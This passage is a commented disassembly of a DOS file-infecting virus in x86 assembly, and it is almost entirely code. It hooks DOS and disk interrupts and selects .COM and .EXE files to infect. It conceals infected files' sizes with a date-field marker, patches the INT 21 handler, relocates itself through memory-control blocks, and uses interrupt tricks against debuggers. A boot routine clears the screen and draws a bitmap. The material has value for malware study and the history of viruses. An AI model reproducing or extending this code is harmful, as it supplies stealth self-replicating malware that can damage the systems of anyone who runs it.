sub_4		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_5		proc	near
		push	cs
		pop	ds
		mov	ax,5700h
		call	sub_24			; INT 21
		mov	data_53,cx		; (CS:1229=0)
		mov	data_54,dx		; (CS:122B=0)
		mov	ax,4200h
		xor	cx,cx			; Zero register
		mov	dx,cx
		call	sub_24			; INT 21
		mov	ah,3Fh			; '?'
		mov	cl,1Ch
		mov	dx,1200h
		call	sub_24			; INT 21
		mov	ax,4200h
		xor	cx,cx			; Zero register
		mov	dx,cx
		call	sub_24			; INT 21
		mov	ah,3Fh			; '?'
		mov	cl,1Ch
		mov	dx,4
		call	sub_24			; INT 21
		mov	ax,4202h
		xor	cx,cx			; Zero register
		mov	dx,cx
		call	sub_24			; INT 21
		mov	data_80,ax		; (CS:12A9=0)
		mov	data_81,dx		; (CS:12AB=0)
		mov	di,ax
		add	ax,0Fh
		adc	dx,0
		and	ax,0FFF0h
		sub	di,ax
		mov	cx,10h
		div	cx			; ax,dx rem=dx:ax/reg
		mov	si,ax
		retn
sub_5		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_6		proc	near
		mov	ax,4200h
		xor	cx,cx			; Zero register
		mov	dx,cx
		call	sub_24			; INT 21
		mov	ah,40h
		mov	cl,1Ch
		mov	dx,1200h
		call	sub_24			; INT 21
		mov	ax,10h
		mul	si			; dx:ax = reg * ax
		mov	cx,dx
		mov	dx,ax
		mov	ax,4200h
		call	sub_24			; INT 21
		xor	dx,dx			; Zero register
		mov	cx,1000h
		add	cx,di
		mov	ah,40h
		call	sub_24			; INT 21
		mov	ax,5701h
		mov	cx,data_53		; (CS:1229=0)
		mov	dx,data_54		; (CS:122B=0)
		test	dh,80h
		jnz	loc_47			; Jump if not zero
		add	dh,0C8h
loc_47: 	call	sub_24			; INT 21
		cmp	byte ptr dos_ver,3	; (CS:12EE=0)
		jb	loc_ret_48		; Jump if below
		cmp	byte ptr data_103,0	; (CS:12EF=0)
		je	loc_ret_48		; Jump if equal
		push	bx
		mov	dl,data_52		; (CS:1228=0)
		mov	ah,32h
		call	sub_24			; INT 21
		mov	ax,cs:data_101		; (CS:12EC=0)
		mov	[bx+1Eh],ax
		pop	bx
loc_ret_48:
		retn
sub_6		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_7		proc	near
		call	sub_21			; Save REGS in vir's stack
		mov	di,dx
		add	di,0Dh
		push	ds
		pop	es
		jmp	short loc_50		; (0945)
sub_7		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_8		proc	near
		call	sub_21			; Save REGS in vir's stack - save REGS
		push	ds
		pop	es
		mov	di,dx
		mov	cx,50h
		xor	ax,ax			; Zero register
		mov	bl,0
		cmp	byte ptr [di+1],3Ah	; ':'
		jne	loc_49			; Jump if not equal
		mov	bl,[di]
		and	bl,1Fh
loc_49:
		mov	cs:data_52,bl		; (CS:1228=0)
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
loc_50:
		mov	ax,[di-3]
		and	ax,0DFDFh
		add	ah,al
		mov	al,[di-4]
		and	al,0DFh
		add	al,ah
		mov	byte ptr cs:data_31,0	; (CS:0020=0)
		cmp	al,0DFh 		; file name is ....COM
		je	loc_51			; Jump if equal
		inc	byte ptr cs:data_31	; (CS:0020=0)
		cmp	al,0E2h 		; file name is ....EXE
		jne	loc_52			; Jump if not equal
loc_51:
		call	sub_20			; Restore regs from vir's stack
		clc				; Clear carry flag
		retn
loc_52:
		call	sub_20			; Restore regs from vir's stack
		stc				; Set carry flag
		retn
sub_8		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_9		proc	near
		push	bx
		mov	ah,51h
		call	sub_24			; INT 21
		mov	cs:data_77,bx		; (CS:12A3=0)
		pop	bx
		retn
sub_9		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_10		proc	near
		call	sub_13			; (0CC6)
		push	dx
		mov	dl,cs:data_52		; (CS:1228=0)
		mov	ah,36h			; '6'
		call	sub_24			; INT 21
		mul	cx			; dx:ax = reg * ax
		mul	bx			; dx:ax = reg * ax
		mov	bx,dx
		pop	dx
		or	bx,bx			; Zero ?
		jnz	loc_53			; Jump if not zero
		cmp	ax,4000h
		jb	loc_54			; Jump if below
loc_53:
		mov	ax,4300h
		call	sub_24			; INT 21
		jc	loc_54			; Jump if carry Set
		mov	di,cx
		xor	cx,cx			; Zero register
		mov	ax,4301h
		call	sub_24			; INT 21
		cmp	byte ptr cs:data_90,0	; (CS:12DA=0)
		jne	loc_54			; Jump if not equal
		mov	ax,3D02h
		call	sub_24			; INT 21
		jc	loc_54			; Jump if carry Set
		mov	bx,ax
		mov	cx,di
		mov	ax,4301h
		call	sub_24			; INT 21
		push	bx
		mov	dl,cs:data_52		; (CS:1228=0)
		mov	ah,32h			; '2'
		call	sub_24			; INT 21
		mov	ax,[bx+1Eh]
		mov	cs:data_101,ax		; (CS:12EC=0)
		pop	bx
		call	sub_14			; (0D6C)
		retn
loc_54:
		xor	bx,bx			; Zero register
		dec	bx
		call	sub_14			; (0D6C)
		retn
sub_10		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_11		proc	near
		push	cx
		push	dx
		push	ax
		mov	ax,4400h
		call	sub_24			; INT 21
		xor	dl,80h
		test	dl,80h
		jz	loc_55			; Jump if zero
		mov	ax,5700h
		call	sub_24			; INT 21
		test	dh,80h
loc_55:
		pop	ax
		pop	dx
		pop	cx
		retn
sub_11		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_12		proc	near
		call	sub_21			; Save REGS in vir's stack
		mov	ax,4201h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_24			; INT 21
		mov	cs:data_78,ax		; (CS:12A5=0)
		mov	cs:data_79,dx		; (CS:12A7=0)
		mov	ax,4202h
		xor	cx,cx			; Zero register
		xor	dx,dx			; Zero register
		call	sub_24			; INT 21
		mov	cs:data_80,ax		; (CS:12A9=0)
		mov	cs:data_81,dx		; (CS:12AB=0)
		mov	ax,4200h
		mov	dx,cs:data_78		; (CS:12A5=0)
		mov	cx,cs:data_79		; (CS:12A7=0)
		call	sub_24			; INT 21
		call	sub_20			; Restore regs from vir's stack
		retn
sub_12		endp

_21_57: 	or	al,al			; Zero ?
		jnz	loc_58			; Jump if not zero
		and	cs:data_85,0FFFEh	; (CS:12B3=0)
		call	sub_19			; Restore REGS
		call	sub_24			; INT 21
		jc	loc_57			; Jump if carry Set
		test	dh,80h
		jz	loc_56			; Jump if zero
		sub	dh,0C8h
loc_56:
		jmp	loc_11			; (033F)
loc_57:
		or	cs:data_85,1		; (CS:12B3=0)
		jmp	loc_11			; (033F)
loc_58:
		cmp	al,1
		jne	loc_61			; Jump if not equal
		and	cs:data_85,0FFFEh	; (CS:12B3=0)
		test	dh,80h
		jz	loc_59			; Jump if zero
		sub	dh,0C8h
loc_59:
		call	sub_11			; (09E6)
		jz	loc_60			; Jump if zero
		add	dh,0C8h
loc_60:
		call	sub_24			; INT 21
		mov	[bp-4],ax
		adc	cs:data_85,0		; (CS:12B3=0)
		jmp	loc_13			; (0396)
_21_42: 	cmp	al,2
		jne	loc_61			; Jump if not equal
		call	sub_11			; (09E6)
		jz	loc_61			; Jump if zero
		sub	word ptr [bp-0Ah],1000h
		sbb	word ptr [bp-8],0
loc_61:
		jmp	loc_10			; (030F)
_21_3F: 	and	byte ptr cs:data_85,0FEh	; (CS:12B3=0)
		call	sub_11			; (09E6)
		jz	loc_61			; Jump if zero
		mov	cs:data_83,cx		; (CS:12AF=0)
		mov	cs:data_82,dx		; (CS:12AD=0)
		mov	cs:data_84,0		; (CS:12B1=0)
		call	sub_12			; (0A04)
		mov	ax,cs:data_80		; (CS:12A9=0)
		mov	dx,cs:data_81		; (CS:12AB=0)
		sub	ax,1000h
		sbb	dx,0
		sub	ax,cs:data_78		; (CS:12A5=0)
		sbb	dx,cs:data_79		; (CS:12A7=0)
		jns	loc_62			; Jump if not sign
		mov	word ptr [bp-4],0
		jmp	loc_25			; (0549)
loc_62:
		jnz	loc_63			; Jump if not zero
		cmp	ax,cx
		ja	loc_63			; Jump if above
		mov	cs:data_83,ax		; (CS:12AF=0)
loc_63:
		mov	dx,cs:data_78		; (CS:12A5=0)
		mov	cx,cs:data_79		; (CS:12A7=0)
		or	cx,cx			; Zero ?
		jnz	loc_64			; Jump if not zero
		cmp	dx,1Ch
		jbe	loc_65			; Jump if below or =
loc_64:
		mov	dx,cs:data_82		; (CS:12AD=0)
		mov	cx,cs:data_83		; (CS:12AF=0)
		mov	ah,3Fh			; '?'
		call	sub_24			; INT 21
		add	ax,cs:data_84		; (CS:12B1=0)
		mov	[bp-4],ax
		jmp	loc_13			; (0396)
loc_65:
		mov	si,dx
		mov	di,dx
		add	di,cs:data_83		; (CS:12AF=0)
		cmp	di,1Ch
		jb	loc_66			; Jump if below
		xor	di,di			; Zero register
		jmp	short loc_67		; (0B35)
loc_66:
		sub	di,1Ch
		neg	di
loc_67:
		mov	ax,dx
		mov	cx,cs:data_81		; (CS:12AB=0)
		mov	dx,cs:data_80		; (CS:12A9=0)
		add	dx,0Fh
		adc	cx,0
		and	dx,0FFF0h
		sub	dx,0FFCh
		sbb	cx,0
		add	dx,ax
		adc	cx,0
		mov	ax,4200h
		call	sub_24			; INT 21
		mov	cx,1Ch
		sub	cx,di
		sub	cx,si
		mov	ah,3Fh			; '?'
		mov	dx,cs:data_82		; (CS:12AD=0)
		call	sub_24			; INT 21
		add	cs:data_82,ax		; (CS:12AD=0)
		sub	cs:data_83,ax		; (CS:12AF=0)
		add	cs:data_84,ax		; (CS:12B1=0)
		xor	cx,cx			; Zero register
		mov	dx,1Ch
		mov	ax,4200h
		call	sub_24			; INT 21
		jmp	loc_64			; (0B04)
_21_40: 	and	byte ptr cs:data_85,0FEh	; (CS:12B3=0)
		call	sub_11			; (09E6)
		jnz	loc_68			; Jump if not zero
		jmp	loc_61			; (0AA2)
loc_68:
		mov	cs:data_83,cx		; (CS:12AF=0)
		mov	cs:data_82,dx		; (CS:12AD=0)
		mov	cs:data_84,0		; (CS:12B1=0)
		call	sub_12			; (0A04)
		mov	ax,cs:data_80		; (CS:12A9=0)
		mov	dx,cs:data_81		; (CS:12AB=0)
		sub	ax,1000h
		sbb	dx,0
		sub	ax,cs:data_78		; (CS:12A5=0)
		sbb	dx,cs:data_79		; (CS:12A7=0)
		js	loc_69			; Jump if sign=1
		jmp	short loc_71		; (0C47)
loc_69:
		call	sub_13			; (0CC6)
		push	cs
		pop	ds
		mov	dx,data_80		; (CS:12A9=0)
		mov	cx,data_81		; (CS:12AB=0)
		add	dx,0Fh
		adc	cx,0
		and	dx,0FFF0h
		sub	dx,0FFCh
		sbb	cx,0
		mov	ax,4200h
		call	sub_24			; INT 21
		mov	dx,4
		mov	cx,1Ch
		mov	ah,3Fh			; '?'
		call	sub_24			; INT 21
		mov	ax,4200h
		xor	cx,cx			; Zero register
		mov	dx,cx
		call	sub_24			; INT 21
		mov	dx,4
		mov	cx,1Ch
		mov	ah,40h			; '@'
		call	sub_24			; INT 21
		mov	dx,0F000h
		mov	cx,0FFFFh
		mov	ax,4202h
		call	sub_24			; INT 21
		mov	ah,40h			; '@'
		xor	cx,cx			; Zero register
		call	sub_24			; INT 21
		mov	dx,data_78		; (CS:12A5=0)
		mov	cx,data_79		; (CS:12A7=0)
		mov	ax,4200h
		call	sub_24			; INT 21
		mov	ax,5700h
		call	sub_24			; INT 21
		test	dh,80h
		jz	loc_70			; Jump if zero
		sub	dh,0C8h
		mov	ax,5701h
		call	sub_24			; INT 21
loc_70:
		call	sub_14			; (0D6C)
		jmp	loc_10			; (030F)
loc_71:
		jnz	loc_72			; Jump if not zero
		cmp	ax,cx
		ja	loc_72			; Jump if above
		jmp	loc_69			; (0BC9)
loc_72:
		mov	dx,cs:data_78		; (CS:12A5=0)
		mov	cx,cs:data_79		; (CS:12A7=0)
		or	cx,cx			; Zero ?
		jnz	loc_73			; Jump if not zero
		cmp	dx,1Ch
		ja	loc_73			; Jump if above
		jmp	loc_69			; (0BC9)
loc_73:
		call	sub_19			; Restore REGS
		call	sub_24			; INT 21
		call	sub_17			; Save REGS
		mov	ax,5700h
		call	sub_24			; INT 21
		test	dh,80h
		jnz	loc_74			; Jump if not zero
		add	dh,0C8h
		mov	ax,5701h
		call	sub_24			; INT 21
loc_74: 	jmp	loc_13			; (0396)
		jmp	loc_10			; (030F)

int_13: 	pop	word ptr cs:data_65	; (CS:1241=0)
		pop	word ptr cs:data_65+2	; (CS:1243=0)
		pop	cs:data_91		; (CS:12DB=0)
		and	cs:data_91,0FFFEh	; (CS:12DB=0)
		cmp	byte ptr cs:data_90,0	; (CS:12DA=0)
		jne	loc_75			; Jump if not equal
		push	cs:data_91		; (CS:12DB=0)
		call	dword ptr cs:old_INT	; (CS:122D=0)
		jnc	loc_76			; Jump if carry=0
		inc	cs:data_90		; (CS:12DA=0)
loc_75: 	stc				; Set carry flag
loc_76: 	jmp	dword ptr cs:data_65	; (CS:1241=0)

int_24: 	xor	al,al			; Zero register
		mov	byte ptr cs:data_90,1	; (CS:12DA=0)
		iret				; Interrupt return

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_13		proc	near
		mov	byte ptr cs:data_90,0	; (CS:12DA=0)
		call	sub_21			; Save REGS in vir's stack
		push	cs
		pop	ds
		mov	al,13h
		call	sub_1			; Get INT 13 vector
		mov	word ptr old_INT,bx	; (CS:122D=0)
		mov	word ptr old_INT+2,es	; (CS:122F=70h)
		mov	word ptr old_INT_13,bx	; (CS:1239=0)
		mov	word ptr old_INT_13+2,es ; (CS:123B=70h)
		mov	dl,0
		mov	al,0Dh
		call	sub_1			; Get INT 0D vector
		mov	ax,es
		cmp	ax,0C000h
		jae	loc_77			; Jump if above or =
		mov	dl,2
loc_77:
		mov	al,0Eh
		call	sub_1			; Get INT 0E vector
		mov	ax,es
		cmp	ax,0C000h
		jae	loc_78			; Jump if above or =
		mov	dl,2
loc_78:
		mov	data_73,dl		; (CS:1250=0)
		call	sub_22			; Set INT 01 for debuging
		mov	data_92,ss		; (CS:12DD=151Ch)
		mov	data_93,sp		; (CS:12DF=0)
		push	cs
		mov	ax,offset loc_79
		push	ax
		mov	ax,70h
		mov	es,ax
		mov	cx,0FFFFh
		mov	al,0CBh
		xor	di,di			; Zero register
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		dec	di
		pushf				; Push flags
		push	es
		push	di
		pushf				; Push flags
		pop	ax
		or	ah,1
		push	ax
		in	al,21h			; port 21h, 8259-1 int IMR
		mov	data_97,al		; (CS:12E5=0)
		mov	al,0FFh
		out	21h,al			; port 21h, 8259-1 int comands
		popf				; Pop flags
		xor	ax,ax			; Zero register
		jmp	dword ptr old_INT	; (CS:122D=0)
loc_79:
		lds	dx,old_INT_1		; (CS:1231=0) Load 32 bit ptr
		mov	al,1
		call	sub_27			; Set INT 01 vector
		push	cs
		pop	ds
		mov	dx,offset int_13
		mov	al,13h
		call	sub_27			; Set INT 13 vector
		mov	al,24h
		call	sub_1			; Get INT 24 vector
		mov	word ptr old_INT_24,bx	; (CS:123D=0)
		mov	word ptr old_INT_24+2,es ; (CS:123F=70h)
		mov	dx,offset int_24
		mov	al,24h
		call	sub_27			; Set INT 24 vector
		call	sub_20			; Restore regs from vir's stack
		retn
sub_13		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_14		proc	near
		call	sub_21			; Save REGS in vir's stack
		lds	dx,dword ptr cs:old_INT_13 ; (CS:1239=0) Load 32 bit ptr
		mov	al,13h
		call	sub_27			; Set INT 13 vector
		lds	dx,dword ptr cs:old_INT_24 ; (CS:123D=0) Load 32 bit ptr
		mov	al,24h
		call	sub_27			; Set INT 24 vector
		call	sub_20			; Restore regs from vir's stack
		retn
sub_14		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_15		proc	near
		mov	ax,3300h		; Get CTRL-BREAK state
		call	sub_24			; INT 21
		mov	cs:data_94,dl		; (CS:12E1) save state
		mov	ax,3301h
		xor	dl,dl			; Set CTRL-BREAK = OFF
		call	sub_24			; INT 21
		retn
sub_15		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_16		proc	near
		mov	dl,cs:data_94		; (CS:12E1)
		mov	ax,3301h		; Restore CTRL-BREAK state
		call	sub_24			; INT 21
		retn
sub_16		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_17		proc	near
		pop	cs:data_100		; (CS:12EA=0)
		pushf				; Push flags
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	ds
		push	es
		jmp	word ptr cs:data_100	; (CS:12EA=0)
sub_17		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_18		proc	near
		les	di,dword ptr cs:ptr_INT_21 ; (CS:1235=0) Load 32 bit ptr
		mov	si,offset data_70	   ; (CS:124B=0)
		push	cs
		pop	ds
		cld				   ; Clear direction
		mov	cx,5

locloop_80:
		lodsb				; String [si] to al
		xchg	al,es:[di]
		mov	[si-1],al
		inc	di
		loop	locloop_80		; Loop if cx > 0

		retn
sub_18		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_19		proc	near
		pop	cs:data_100		; (CS:12EA=0)
		pop	es
		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		popf				; Pop flags
		jmp	word ptr cs:data_100	; (CS:12EA=0)

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_20:
		mov	cs:data_114,offset sub_19 ; (CS:135D=0) Restore REGS
		jmp	short loc_81		  ; (0DF6)

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_21:
		mov	cs:data_114,offset sub_17 ; (CS:135D=0) Save REGS
loc_81: 	mov	cs:data_112,ss		; (CS:1359=151Ch)
		mov	cs:data_111,sp		; (CS:1357=0)
		push	cs
		pop	ss
		mov	sp,cs:data_113		; (CS:135B=0)
		call	word ptr cs:data_114	; (CS:135D=0)
		mov	cs:data_113,sp		; (CS:135B=0)
		mov	ss,cs:data_112		; (CS:1359=151Ch)
		mov	sp,cs:data_111		; (CS:1357=0)
		retn
sub_19		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_22		proc	near
		mov	al,1
		call	sub_1			   ; Get INT 01 vector
		mov	word ptr cs:old_INT_1,bx   ; (CS:1231=0)
		mov	word ptr cs:old_INT_1+2,es ; (CS:1233=70h)
		push	cs
		pop	ds
		mov	dx,offset debug
		call	sub_27			   ; Set INT 01 vector
		retn
sub_22		endp

_21_48: 	call	sub_23		; (0E3A)
		jmp	loc_10		; (030F)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_23		proc	near
		cmp	byte ptr cs:data_95,0	; (CS:12E2=0)
		je	loc_ret_83		; Jump if equal
		cmp	bx,0FFFFh
		jne	loc_ret_83		; Jump if not equal
		mov	bx,160h
		call	sub_24			; INT 21
		jc	loc_ret_83		; Jump if carry Set
		mov	dx,cs
		cmp	ax,dx
		jb	loc_82			; Jump if below
		mov	es,ax
		mov	ah,49h
		call	sub_24			; INT 21
		jmp	short loc_ret_83	; (0E8A)
loc_82:
		dec	dx
		mov	ds,dx
		mov	word ptr ds:MCB_0001,0	; (7DBC:0001=275h)
		inc	dx
		mov	ds,dx
		mov	es,ax
		push	ax
		mov	cs:data_72,ax		; (CS:124E=7DBDh)
		xor	si,si			; Zero register
		mov	di,si
		mov	cx,all_len/2
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		dec	ax
		mov	es,ax
		mov	ax,cs:data_69		; (CS:1249=0)
		mov	es:MCB_0001,ax		; (48FF:0001=0FFFFh)
		mov	ax,offset loc_ret_83
		push	ax
		retf
loc_ret_83:	retn
sub_23		endp

_21_37: 	mov	byte ptr cs:data_104,2	; (CS:12F0=0)
		jmp	loc_10			; (030F)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_24		proc	near			; calls INT 21
		pushf
		call	dword ptr cs:ptr_INT_21 ; (CS:1235=0)
		retn
sub_24		endp

boot:		cli				; Disable interrupts
		xor	ax,ax			; Zero register
		mov	ss,ax
		mov	sp,7C00h
		jmp	short loc_85		; (0EF4)

data1		db	0dbh,0dbh,0dbh, 20h
data2		db	0f9h,0e0h,0e3h,0c3h
		db	 80h, 81h, 11h, 12h, 24h, 40h, 81h, 11h
		db	 12h, 24h, 40h,0F1h,0F1h, 12h, 24h, 40h
		db	 81h, 21h, 12h, 24h, 40h, 81h, 10h,0e3h
		db	0C3h, 80h, 00h, 00h, 00h, 00h, 00h, 00h
		db	 00h, 00h, 00h, 00h, 82h, 44h,0F8h, 70h
		db	0C0h, 82h, 44h, 80h, 88h,0C0h, 82h, 44h
		db	 80h, 80h,0C0h, 82h, 44h,0F0h, 70h,0C0h
		db	 82h, 28h, 80h, 08h,0C0h, 82h, 28h, 80h
		db	 88h, 00h,0F2h, 10h,0F8h, 70h,0C0h

loc_85: 	push	cs
		pop	ds
		mov	dx,0B000h
		mov	ah,0Fh
		int	10h			; Video display   ah=functn 0Fh
						;  get state, al=mode, bh=page
		cmp	al,7
		je	loc_86			; Jump if equal
		mov	dx,0B800h
loc_86:
		mov	es,dx
		cld				; Clear direction
		xor	di,di			; Zero register
		mov	cx,7D0h
		mov	ax,720h
		rep	stosw			; Rep when cx >0 Store ax to es:[di]
		mov	si,data2-boot+7C00h	; (CS:7C0E=0)
		mov	bx,2AEh
loc_87:
		mov	bp,5
		mov	di,bx
loc_88:
		lodsb				; String [si] to al
		mov	dh,al
		mov	cx,8

locloop_89:
		mov	ax,720h
		shl	dx,1			; Shift w/zeros fill
		jnc	loc_90			; Jump if carry=0
		mov	al,0DBh
loc_90:
		stosw				; Store ax to es:[di]
		loop	locloop_89		; Loop if cx > 0

		dec	bp
		jnz	loc_88			; Jump if not zero
		add	bx,0A0h
		cmp	si,loc_85-boot+7C00h
		jb	loc_87			; Jump if below
		mov	ah,1
		int	10h			; Video display   ah=functn 01h
